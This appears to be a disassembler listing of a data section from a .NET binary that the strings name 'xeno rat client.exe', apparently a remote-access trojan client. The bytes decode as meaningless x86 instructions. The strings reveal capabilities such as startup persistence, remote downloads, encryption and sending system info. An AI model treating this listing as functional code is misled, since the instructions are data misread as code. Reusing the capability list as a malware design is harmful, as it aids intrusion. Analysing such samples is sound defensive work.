  409e9e:	62 6c 79 52          	bound  %ebp,0x52(%ecx,%edi,2)
  409ea2:	65 73 6f             	gs jae 0x409f14
  409ea5:	6c                   	insb   (%dx),%es:(%edi)
  409ea6:	76 65                	jbe    0x409f0d
  409ea8:	00 43 75             	add    %al,0x75(%ebx)
  409eab:	72 72                	jb     0x409f1f
  409ead:	65 6e                	outsb  %gs:(%esi),(%dx)
  409eaf:	74 44                	je     0x409ef5
  409eb1:	6f                   	outsl  %ds:(%esi),(%dx)
  409eb2:	6d                   	insl   (%dx),%es:(%edi)
  409eb3:	61                   	popa
  409eb4:	69 6e 5f 41 73 73 65 	imul   $0x65737341,0x5f(%esi),%ebp
  409ebb:	6d                   	insl   (%dx),%es:(%edi)
  409ebc:	62 6c 79 52          	bound  %ebp,0x52(%ecx,%edi,2)
  409ec0:	65 73 6f             	gs jae 0x409f32
  409ec3:	6c                   	insb   (%dx),%es:(%edi)
  409ec4:	76 65                	jbe    0x409f2b
  409ec6:	00 52 65             	add    %dl,0x65(%edx)
  409ec9:	6d                   	insl   (%dx),%es:(%edi)
  409eca:	6f                   	outsl  %ds:(%esi),(%dx)
  409ecb:	76 65                	jbe    0x409f32
  409ecd:	00 78 65             	add    %bh,0x65(%eax)
  409ed0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ed1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ed2:	20 72 61             	and    %dh,0x61(%edx)
  409ed5:	74 20                	je     0x409ef7
  409ed7:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  409edb:	6e                   	outsb  %ds:(%esi),(%dx)
  409edc:	74 2e                	je     0x409f0c
  409ede:	65 78 65             	gs js  0x409f46
  409ee1:	00 63 62             	add    %ah,0x62(%ebx)
  409ee4:	53                   	push   %ebx
  409ee5:	69 7a 65 00 46 69 6e 	imul   $0x6e694600,0x65(%edx),%edi
  409eec:	61                   	popa
  409eed:	6c                   	insb   (%dx),%es:(%edi)
  409eee:	55                   	push   %ebp
  409eef:	6e                   	outsb  %ds:(%esi),(%dx)
  409ef0:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  409ef3:	70 72                	jo     0x409f67
  409ef5:	65 73 73             	gs jae 0x409f6b
  409ef8:	65 64 53             	gs fs push %ebx
  409efb:	69 7a 65 00 52 74 6c 	imul   $0x6c745200,0x65(%edx),%edi
  409f02:	47                   	inc    %edi
  409f03:	65 74 43             	gs je  0x409f49
  409f06:	6f                   	outsl  %ds:(%esi),(%dx)
  409f07:	6d                   	insl   (%dx),%es:(%edi)
  409f08:	70 72                	jo     0x409f7c
  409f0a:	65 73 73             	gs jae 0x409f80
  409f0d:	69 6f 6e 57 6f 72 6b 	imul   $0x6b726f57,0x6e(%edi),%ebp
  409f14:	53                   	push   %ebx
  409f15:	70 61                	jo     0x409f78
  409f17:	63 65 53             	arpl   %esp,0x53(%ebp)
  409f1a:	69 7a 65 00 4f 72 69 	imul   $0x69724f00,0x65(%edx),%edi
  409f21:	67 69 6e 61 6c 46 69 	imul   $0x6c69466c,0x61(%bp),%ebp
  409f28:	6c 
  409f29:	65 53                	gs push %ebx
  409f2b:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  409f32:	5f                   	pop    %edi
  409f33:	54                   	push   %esp
  409f34:	6f                   	outsl  %ds:(%esi),(%dx)
  409f35:	74 61                	je     0x409f98
  409f37:	6c                   	insb   (%dx),%es:(%edi)
  409f38:	53                   	push   %ebx
  409f39:	69 7a 65 00 70 44 65 	imul   $0x65447000,0x65(%edx),%edi
  409f40:	73 74                	jae    0x409fb6
  409f42:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  409f49:	53                   	push   %ebx
  409f4a:	69 7a 65 00 70 4e 65 	imul   $0x654e7000,0x65(%edx),%edi
  409f51:	65 64 65 64 42       	gs fs gs fs inc %edx
  409f56:	75 66                	jne    0x409fbe
  409f58:	66 65 72 53          	data16 gs jb 0x409faf
  409f5c:	69 7a 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%edx),%edi
  409f63:	70 72                	jo     0x409fd7
  409f65:	65 73 73             	gs jae 0x409fdb
  409f68:	65 64 42             	gs fs inc %edx
  409f6b:	75 66                	jne    0x409fd3
  409f6d:	66 65 72 53          	data16 gs jb 0x409fc4
  409f71:	69 7a 65 00 55 6e 63 	imul   $0x636e5500,0x65(%edx),%edi
  409f78:	6f                   	outsl  %ds:(%esi),(%dx)
  409f79:	6d                   	insl   (%dx),%es:(%edi)
  409f7a:	70 72                	jo     0x409fee
  409f7c:	65 73 73             	gs jae 0x409ff2
  409f7f:	65 64 42             	gs fs inc %edx
  409f82:	75 66                	jne    0x409fea
  409f84:	66 65 72 53          	data16 gs jb 0x409fdb
  409f88:	69 7a 65 00 6f 72 69 	imul   $0x69726f00,0x65(%edx),%edi
  409f8f:	67 69 6e 61 6c 5f 73 	imul   $0x69735f6c,0x61(%bp),%ebp
  409f96:	69 
  409f97:	7a 65                	jp     0x409ffe
  409f99:	00 52 65             	add    %dl,0x65(%edx)
  409f9c:	73 69                	jae    0x40a007
  409f9e:	7a 65                	jp     0x40a005
  409fa0:	00 53 69             	add    %dl,0x69(%ebx)
  409fa3:	7a 65                	jp     0x40a00a
  409fa5:	4f                   	dec    %edi
  409fa6:	66 00 49 6e          	data16 add %cl,0x6e(%ecx)
  409faa:	64 65 78 4f          	fs gs js 0x409ffd
  409fae:	66 00 53 79          	data16 add %dl,0x79(%ebx)
  409fb2:	73 74                	jae    0x40a028
  409fb4:	65 6d                	gs insl (%dx),%es:(%edi)
  409fb6:	2e 54                	cs push %esp
  409fb8:	68 72 65 61 64       	push   $0x64616572
  409fbd:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  409fc4:	5f                   	pop    %edi
  409fc5:	45                   	inc    %ebp
  409fc6:	6e                   	outsb  %ds:(%esi),(%dx)
  409fc7:	63 6f 64             	arpl   %ebp,0x64(%edi)
  409fca:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  409fd1:	74 65                	je     0x40a038
  409fd3:	6d                   	insl   (%dx),%es:(%edi)
  409fd4:	2e 52                	cs push %edx
  409fd6:	75 6e                	jne    0x40a046
  409fd8:	74 69                	je     0x40a043
  409fda:	6d                   	insl   (%dx),%es:(%edi)
  409fdb:	65 2e 56             	gs cs push %esi
  409fde:	65 72 73             	gs jb  0x40a054
  409fe1:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  409fe8:	46                   	inc    %esi
  409fe9:	72 6f                	jb     0x40a05a
  409feb:	6d                   	insl   (%dx),%es:(%edi)
  409fec:	42                   	inc    %edx
  409fed:	61                   	popa
  409fee:	73 65                	jae    0x40a055
  409ff0:	36 34 53             	ss xor $0x53,%al
  409ff3:	74 72                	je     0x40a067
  409ff5:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  409ffc:	6e                   	outsb  %ds:(%esi),(%dx)
  409ffd:	6c                   	insb   (%dx),%es:(%edi)
  409ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  409fff:	61                   	popa
  40a000:	64 53                	fs push %ebx
  40a002:	74 72                	je     0x40a076
  40a004:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  40a00b:	74 72                	je     0x40a07f
  40a00d:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  40a014:	53                   	push   %ebx
  40a015:	74 72                	je     0x40a089
  40a017:	69 6e 67 00 6d 75 74 	imul   $0x74756d00,0x67(%esi),%ebp
  40a01e:	65 78 5f             	gs js  0x40a080
  40a021:	73 74                	jae    0x40a097
  40a023:	72 69                	jb     0x40a08e
  40a025:	6e                   	outsb  %ds:(%esi),(%dx)
  40a026:	67 00 53 75          	add    %dl,0x75(%bp,%di)
  40a02a:	62 73 74             	bound  %esi,0x74(%ebx)
  40a02d:	72 69                	jb     0x40a098
  40a02f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a030:	67 00 50 72          	add    %dl,0x72(%bx,%si)
  40a034:	6f                   	outsl  %ds:(%esi),(%dx)
  40a035:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a038:	73 4c                	jae    0x40a086
  40a03a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a03b:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  40a03f:	6d                   	insl   (%dx),%es:(%edi)
  40a040:	70 75                	jo     0x40a0b7
  40a042:	74 65                	je     0x40a0a9
  40a044:	48                   	dec    %eax
  40a045:	61                   	popa
  40a046:	73 68                	jae    0x40a0b0
  40a048:	00 73 74             	add    %dh,0x74(%ebx)
  40a04b:	72 54                	jb     0x40a0a1
  40a04d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a04e:	48                   	dec    %eax
  40a04f:	61                   	popa
  40a050:	73 68                	jae    0x40a0ba
  40a052:	00 47 65             	add    %al,0x65(%edi)
  40a055:	74 48                	je     0x40a09f
  40a057:	61                   	popa
  40a058:	73 68                	jae    0x40a0c2
  40a05a:	00 65 78             	add    %ah,0x78(%ebp)
  40a05d:	65 63 75 74          	arpl   %esi,%gs:0x74(%ebp)
  40a061:	61                   	popa
  40a062:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  40a066:	61                   	popa
  40a067:	74 68                	je     0x40a0d1
  40a069:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a06c:	73 74                	jae    0x40a0e2
  40a06e:	61                   	popa
  40a06f:	6c                   	insb   (%dx),%es:(%edi)
  40a070:	6c                   	insb   (%dx),%es:(%edi)
  40a071:	5f                   	pop    %edi
  40a072:	70 61                	jo     0x40a0d5
  40a074:	74 68                	je     0x40a0de
  40a076:	00 63 6c             	add    %ah,0x6c(%ebx)
  40a079:	61                   	popa
  40a07a:	73 73                	jae    0x40a0ef
  40a07c:	70 61                	jo     0x40a0df
  40a07e:	74 68                	je     0x40a0e8
  40a080:	00 53 6f             	add    %dl,0x6f(%ebx)
  40a083:	75 72                	jne    0x40a0f7
  40a085:	63 65 42             	arpl   %esp,0x42(%ebp)
  40a088:	75 66                	jne    0x40a0f0
  40a08a:	66 65 72 4c          	data16 gs jb 0x40a0da
  40a08e:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a090:	67 74 68             	addr16 je 0x40a0fb
  40a093:	00 44 65 73          	add    %al,0x73(%ebp,%eiz,2)
  40a097:	74 69                	je     0x40a102
  40a099:	6e                   	outsb  %ds:(%esi),(%dx)
  40a09a:	61                   	popa
  40a09b:	74 69                	je     0x40a106
  40a09d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a09e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a09f:	42                   	inc    %edx
  40a0a0:	75 66                	jne    0x40a108
  40a0a2:	66 65 72 4c          	data16 gs jb 0x40a0f2
  40a0a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a0a8:	67 74 68             	addr16 je 0x40a113
  40a0ab:	00 47 65             	add    %al,0x65(%edi)
  40a0ae:	74 57                	je     0x40a107
  40a0b0:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  40a0b7:	78 74                	js     0x40a12d
  40a0b9:	4c                   	dec    %esp
  40a0ba:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a0bc:	67 74 68             	addr16 je 0x40a127
  40a0bf:	00 70 6c             	add    %dh,0x6c(%eax)
  40a0c2:	69 69 00 41 73 79 6e 	imul   $0x6e797341,0x0(%ecx),%ebp
  40a0c9:	63 43 61             	arpl   %eax,0x61(%ebx)
  40a0cc:	6c                   	insb   (%dx),%es:(%edi)
  40a0cd:	6c                   	insb   (%dx),%es:(%edi)
  40a0ce:	62 61 63             	bound  %esp,0x63(%ecx)
  40a0d1:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a0d4:	72 65                	jb     0x40a13b
  40a0d6:	61                   	popa
  40a0d7:	74 65                	je     0x40a13e
  40a0d9:	53                   	push   %ebx
  40a0da:	75 62                	jne    0x40a13e
  40a0dc:	53                   	push   %ebx
  40a0dd:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0de:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a0e1:	46                   	inc    %esi
  40a0e2:	6c                   	insb   (%dx),%es:(%edi)
  40a0e3:	75 73                	jne    0x40a158
  40a0e5:	68 46 69 6e 61       	push   $0x616e6946
  40a0ea:	6c                   	insb   (%dx),%es:(%edi)
  40a0eb:	42                   	inc    %edx
  40a0ec:	6c                   	insb   (%dx),%es:(%edi)
  40a0ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0ee:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a0f1:	5f                   	pop    %edi
  40a0f2:	73 6f                	jae    0x40a163
  40a0f4:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40a0f7:	67 65 74 5f          	addr16 gs je 0x40a15a
  40a0fb:	54                   	push   %esp
  40a0fc:	61                   	popa
  40a0fd:	73 6b                	jae    0x40a16a
  40a0ff:	00 4d 61             	add    %cl,0x61(%ebp)
  40a102:	72 73                	jb     0x40a177
  40a104:	68 61 6c 00 53       	push   $0x53006c61
  40a109:	79 73                	jns    0x40a17e
  40a10b:	74 65                	je     0x40a172
  40a10d:	6d                   	insl   (%dx),%es:(%edi)
  40a10e:	2e 53                	cs push %ebx
  40a110:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40a114:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  40a11b:	6e 
  40a11c:	63 69 70             	arpl   %ebp,0x70(%ecx)
  40a11f:	61                   	popa
  40a120:	6c                   	insb   (%dx),%es:(%edi)
  40a121:	00 53 79             	add    %dl,0x79(%ebx)
  40a124:	73 74                	jae    0x40a19a
  40a126:	65 6d                	gs insl (%dx),%es:(%edi)
  40a128:	2e 43                	cs inc %ebx
  40a12a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a12b:	6d                   	insl   (%dx),%es:(%edi)
  40a12c:	70 6f                	jo     0x40a19d
  40a12e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a12f:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a131:	74 4d                	je     0x40a180
  40a133:	6f                   	outsl  %ds:(%esi),(%dx)
  40a134:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  40a137:	00 55 6e             	add    %dl,0x6e(%ebp)
  40a13a:	69 6e 73 74 61 6c 6c 	imul   $0x6c6c6174,0x73(%esi),%ebp
  40a141:	00 6b 65             	add    %ch,0x65(%ebx)
  40a144:	72 6e                	jb     0x40a1b4
  40a146:	65 6c                	gs insb (%dx),%es:(%edi)
  40a148:	33 32                	xor    (%edx),%esi
  40a14a:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a14d:	6c                   	insb   (%dx),%es:(%edi)
  40a14e:	00 73 68             	add    %dh,0x68(%ebx)
  40a151:	65 6c                	gs insb (%dx),%es:(%edi)
  40a153:	6c                   	insb   (%dx),%es:(%edi)
  40a154:	33 32                	xor    (%edx),%esi
  40a156:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a159:	6c                   	insb   (%dx),%es:(%edi)
  40a15a:	00 55 73             	add    %dl,0x73(%ebp)
  40a15d:	65 72 33             	gs jb  0x40a193
  40a160:	32 2e                	xor    (%esi),%ch
  40a162:	64 6c                	fs insb (%dx),%es:(%edi)
  40a164:	6c                   	insb   (%dx),%es:(%edi)
  40a165:	00 75 73             	add    %dh,0x73(%ebp)
  40a168:	65 72 33             	gs jb  0x40a19e
  40a16b:	32 2e                	xor    (%esi),%ch
  40a16d:	64 6c                	fs insb (%dx),%es:(%edi)
  40a16f:	6c                   	insb   (%dx),%es:(%edi)
  40a170:	00 6e 74             	add    %ch,0x74(%esi)
  40a173:	64 6c                	fs insb (%dx),%es:(%edi)
  40a175:	6c                   	insb   (%dx),%es:(%edi)
  40a176:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a179:	6c                   	insb   (%dx),%es:(%edi)
  40a17a:	00 6d 73             	add    %ch,0x73(%ebp)
  40a17d:	76 63                	jbe    0x40a1e2
  40a17f:	72 74                	jb     0x40a1f5
  40a181:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a184:	6c                   	insb   (%dx),%es:(%edi)
  40a185:	00 4b 69             	add    %cl,0x69(%ebx)
  40a188:	6c                   	insb   (%dx),%es:(%edi)
  40a189:	6c                   	insb   (%dx),%es:(%edi)
  40a18a:	00 43 72             	add    %al,0x72(%ebx)
  40a18d:	79 70                	jns    0x40a1ff
  40a18f:	74 6f                	je     0x40a200
  40a191:	53                   	push   %ebx
  40a192:	74 72                	je     0x40a206
  40a194:	65 61                	gs popa
  40a196:	6d                   	insl   (%dx),%es:(%edi)
  40a197:	00 4d 65             	add    %cl,0x65(%ebp)
  40a19a:	6d                   	insl   (%dx),%es:(%edi)
  40a19b:	6f                   	outsl  %ds:(%esi),(%dx)
  40a19c:	72 79                	jb     0x40a217
  40a19e:	53                   	push   %ebx
  40a19f:	74 72                	je     0x40a213
  40a1a1:	65 61                	gs popa
  40a1a3:	6d                   	insl   (%dx),%es:(%edi)
  40a1a4:	00 50 72             	add    %dl,0x72(%eax)
  40a1a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a8:	67 72 61             	addr16 jb 0x40a20c
  40a1ab:	6d                   	insl   (%dx),%es:(%edi)
  40a1ac:	00 68 4d             	add    %ch,0x4d(%eax)
  40a1af:	65 6d                	gs insl (%dx),%es:(%edi)
  40a1b1:	00 67 65             	add    %ah,0x65(%edi)
  40a1b4:	74 5f                	je     0x40a215
  40a1b6:	49                   	dec    %ecx
  40a1b7:	74 65                	je     0x40a21e
  40a1b9:	6d                   	insl   (%dx),%es:(%edi)
  40a1ba:	00 73 65             	add    %dh,0x65(%ebx)
  40a1bd:	74 5f                	je     0x40a21e
  40a1bf:	49                   	dec    %ecx
  40a1c0:	74 65                	je     0x40a227
  40a1c2:	6d                   	insl   (%dx),%es:(%edi)
  40a1c3:	00 4f 70             	add    %cl,0x70(%edi)
  40a1c6:	65 72 61             	gs jb  0x40a22a
  40a1c9:	74 69                	je     0x40a234
  40a1cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1cc:	67 53                	addr16 push %ebx
  40a1ce:	79 73                	jns    0x40a243
  40a1d0:	74 65                	je     0x40a237
  40a1d2:	6d                   	insl   (%dx),%es:(%edi)
  40a1d3:	00 53 79             	add    %dl,0x79(%ebx)
  40a1d6:	6d                   	insl   (%dx),%es:(%edi)
  40a1d7:	6d                   	insl   (%dx),%es:(%edi)
  40a1d8:	65 74 72             	gs je  0x40a24d
  40a1db:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40a1e2:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40a1e9:	73 
  40a1ea:	68 41 6c 67 6f       	push   $0x6f676c41
  40a1ef:	72 69                	jb     0x40a25a
  40a1f1:	74 68                	je     0x40a25b
  40a1f3:	6d                   	insl   (%dx),%es:(%edi)
  40a1f4:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40a1f8:	6d                   	insl   (%dx),%es:(%edi)
  40a1f9:	00 49 43             	add    %cl,0x43(%ecx)
  40a1fc:	72 79                	jb     0x40a277
  40a1fe:	70 74                	jo     0x40a274
  40a200:	6f                   	outsl  %ds:(%esi),(%dx)
  40a201:	54                   	push   %esp
  40a202:	72 61                	jb     0x40a265
  40a204:	6e                   	outsb  %ds:(%esi),(%dx)
  40a205:	73 66                	jae    0x40a26d
  40a207:	6f                   	outsl  %ds:(%esi),(%dx)
  40a208:	72 6d                	jb     0x40a277
  40a20a:	00 42 6f             	add    %al,0x6f(%edx)
  40a20d:	6f                   	outsl  %ds:(%esi),(%dx)
  40a20e:	6c                   	insb   (%dx),%es:(%edi)
  40a20f:	65 61                	gs popa
  40a211:	6e                   	outsb  %ds:(%esi),(%dx)
  40a212:	00 49 73             	add    %cl,0x73(%ecx)
  40a215:	4c                   	dec    %esp
  40a216:	69 74 74 6c 65 45 6e 	imul   $0x646e4565,0x6c(%esp,%esi,2),%esi
  40a21d:	64 
  40a21e:	69 61 6e 00 54 69 6d 	imul   $0x6d695400,0x6e(%ecx),%esp
  40a225:	65 53                	gs push %ebx
  40a227:	70 61                	jo     0x40a28a
  40a229:	6e                   	outsb  %ds:(%esi),(%dx)
  40a22a:	00 5f 4d             	add    %bl,0x4d(%edi)
  40a22d:	61                   	popa
  40a22e:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  40a235:	6f                   	outsl  %ds:(%esi),(%dx)
  40a236:	6d                   	insl   (%dx),%es:(%edi)
  40a237:	61                   	popa
  40a238:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  40a23f:	43                   	inc    %ebx
  40a240:	75 72                	jne    0x40a2b4
  40a242:	72 65                	jb     0x40a2a9
  40a244:	6e                   	outsb  %ds:(%esi),(%dx)
  40a245:	74 44                	je     0x40a28b
  40a247:	6f                   	outsl  %ds:(%esi),(%dx)
  40a248:	6d                   	insl   (%dx),%es:(%edi)
  40a249:	61                   	popa
  40a24a:	69 6e 00 49 73 55 73 	imul   $0x73557349,0x0(%esi),%ebp
  40a251:	65 72 41             	gs jb  0x40a295
  40a254:	6e                   	outsb  %ds:(%esi),(%dx)
  40a255:	41                   	inc    %ecx
  40a256:	64 6d                	fs insl (%dx),%es:(%edi)
  40a258:	69 6e 00 41 64 64 54 	imul   $0x54646441,0x0(%esi),%ebp
  40a25f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a260:	53                   	push   %ebx
  40a261:	74 61                	je     0x40a2c4
  40a263:	72 74                	jb     0x40a2d9
  40a265:	75 70                	jne    0x40a2d7
  40a267:	4e                   	dec    %esi
  40a268:	6f                   	outsl  %ds:(%esi),(%dx)
  40a269:	6e                   	outsb  %ds:(%esi),(%dx)
  40a26a:	41                   	inc    %ecx
  40a26b:	64 6d                	fs insl (%dx),%es:(%edi)
  40a26d:	69 6e 00 41 64 64 54 	imul   $0x54646441,0x0(%esi),%ebp
  40a274:	6f                   	outsl  %ds:(%esi),(%dx)
  40a275:	53                   	push   %ebx
  40a276:	74 61                	je     0x40a2d9
  40a278:	72 74                	jb     0x40a2ee
  40a27a:	75 70                	jne    0x40a2ec
  40a27c:	41                   	inc    %ecx
  40a27d:	64 6d                	fs insl (%dx),%es:(%edi)
  40a27f:	69 6e 00 49 73 41 64 	imul   $0x64417349,0x0(%esi),%ebp
  40a286:	6d                   	insl   (%dx),%es:(%edi)
  40a287:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  40a28e:	00 67 65             	add    %ah,0x65(%edi)
  40a291:	74 5f                	je     0x40a2f2
  40a293:	4f                   	dec    %edi
  40a294:	53                   	push   %ebx
  40a295:	56                   	push   %esi
  40a296:	65 72 73             	gs jb  0x40a30c
  40a299:	69 6f 6e 00 47 65 74 	imul   $0x74654700,0x6e(%edi),%ebp
  40a2a0:	57                   	push   %edi
  40a2a1:	69 6e 64 6f 77 73 56 	imul   $0x5673776f,0x64(%esi),%ebp
  40a2a8:	65 72 73             	gs jb  0x40a31e
  40a2ab:	69 6f 6e 00 43 6f 6d 	imul   $0x6d6f4300,0x6e(%edi),%ebp
  40a2b2:	70 72                	jo     0x40a326
  40a2b4:	65 73 73             	gs jae 0x40a32a
  40a2b7:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  40a2be:	5f                   	pop    %edi
  40a2bf:	4c                   	dec    %esp
  40a2c0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2c1:	63 61 74             	arpl   %esp,0x74(%ecx)
  40a2c4:	69 6f 6e 00 41 63 74 	imul   $0x74634100,0x6e(%edi),%ebp
  40a2cb:	69 6f 6e 00 6f 70 5f 	imul   $0x5f706f00,0x6e(%edi),%ebp
  40a2d2:	53                   	push   %ebx
  40a2d3:	75 62                	jne    0x40a337
  40a2d5:	74 72                	je     0x40a349
  40a2d7:	61                   	popa
  40a2d8:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  40a2dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2dd:	00 53 79             	add    %dl,0x79(%ebx)
  40a2e0:	73 74                	jae    0x40a356
  40a2e2:	65 6d                	gs insl (%dx),%es:(%edi)
  40a2e4:	2e 52                	cs push %edx
  40a2e6:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40a2e9:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a2ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2ef:	00 4d 61             	add    %cl,0x61(%ebp)
  40a2f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a2f3:	61                   	popa
  40a2f4:	67 65 6d             	gs insl (%dx),%es:(%di)
  40a2f7:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a2f9:	74 4f                	je     0x40a34a
  40a2fb:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a2fe:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  40a302:	6c                   	insb   (%dx),%es:(%edi)
  40a303:	6c                   	insb   (%dx),%es:(%edi)
  40a304:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a309:	6e                   	outsb  %ds:(%esi),(%dx)
  40a30a:	00 4b 65             	add    %cl,0x65(%ebx)
  40a30d:	79 43                	jns    0x40a352
  40a30f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a310:	6c                   	insb   (%dx),%es:(%edi)
  40a311:	6c                   	insb   (%dx),%es:(%edi)
  40a312:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a317:	6e                   	outsb  %ds:(%esi),(%dx)
  40a318:	00 61 64             	add    %ah,0x64(%ecx)
  40a31b:	64 5f                	fs pop %edi
  40a31d:	55                   	push   %ebp
  40a31e:	6e                   	outsb  %ds:(%esi),(%dx)
  40a31f:	68 61 6e 64 6c       	push   $0x6c646e61
  40a324:	65 64 45             	gs fs inc %ebp
  40a327:	78 63                	js     0x40a38c
  40a329:	65 70 74             	gs jo  0x40a3a0
  40a32c:	69 6f 6e 00 43 75 72 	imul   $0x72754300,0x6e(%edi),%ebp
  40a333:	72 65                	jb     0x40a39a
  40a335:	6e                   	outsb  %ds:(%esi),(%dx)
  40a336:	74 44                	je     0x40a37c
  40a338:	6f                   	outsl  %ds:(%esi),(%dx)
  40a339:	6d                   	insl   (%dx),%es:(%edi)
  40a33a:	61                   	popa
  40a33b:	69 6e 5f 55 6e 68 61 	imul   $0x61686e55,0x5f(%esi),%ebp
  40a342:	6e                   	outsb  %ds:(%esi),(%dx)
  40a343:	64 6c                	fs insb (%dx),%es:(%edi)
  40a345:	65 64 45             	gs fs inc %ebp
  40a348:	78 63                	js     0x40a3ad
  40a34a:	65 70 74             	gs jo  0x40a3c1
  40a34d:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  40a354:	75 6d                	jne    0x40a3c3
  40a356:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a358:	74 4e                	je     0x40a3a8
  40a35a:	75 6c                	jne    0x40a3c8
  40a35c:	6c                   	insb   (%dx),%es:(%edi)
  40a35d:	45                   	inc    %ebp
  40a35e:	78 63                	js     0x40a3c3
  40a360:	65 70 74             	gs jo  0x40a3d7
  40a363:	69 6f 6e 00 53 65 74 	imul   $0x74655300,0x6e(%edi),%ebp
  40a36a:	45                   	inc    %ebp
  40a36b:	78 63                	js     0x40a3d0
  40a36d:	65 70 74             	gs jo  0x40a3e4
  40a370:	69 6f 6e 00 45 6e 63 	imul   $0x636e4500,0x6e(%edi),%ebp
  40a377:	72 79                	jb     0x40a3f2
  40a379:	70 74                	jo     0x40a3ef
  40a37b:	69 6f 6e 00 52 75 6e 	imul   $0x6e755200,0x6e(%edi),%ebp
  40a382:	00 55 6e             	add    %dl,0x6e(%ebp)
  40a385:	6b 6e 6f 77          	imul   $0x77,0x6f(%esi),%ebp
  40a389:	6e                   	outsb  %ds:(%esi),(%dx)
  40a38a:	00 47 65             	add    %al,0x65(%edi)
  40a38d:	74 41                	je     0x40a3d0
  40a38f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a390:	64 53                	fs push %ebx
  40a392:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a394:	64 49                	fs dec %ecx
  40a396:	6e                   	outsb  %ds:(%esi),(%dx)
  40a397:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a399:	00 4d 65             	add    %cl,0x65(%ebp)
  40a39c:	74 68                	je     0x40a406
  40a39e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a39f:	64 49                	fs dec %ecx
  40a3a1:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3a2:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3a4:	00 53 65             	add    %dl,0x65(%ebx)
  40a3a7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3a8:	64 55                	fs push %ebp
  40a3aa:	70 64                	jo     0x40a410
  40a3ac:	61                   	popa
  40a3ad:	74 65                	je     0x40a414
  40a3af:	49                   	dec    %ecx
  40a3b0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3b1:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a3b3:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  40a3b7:	76 65                	jbe    0x40a41e
  40a3b9:	49                   	dec    %ecx
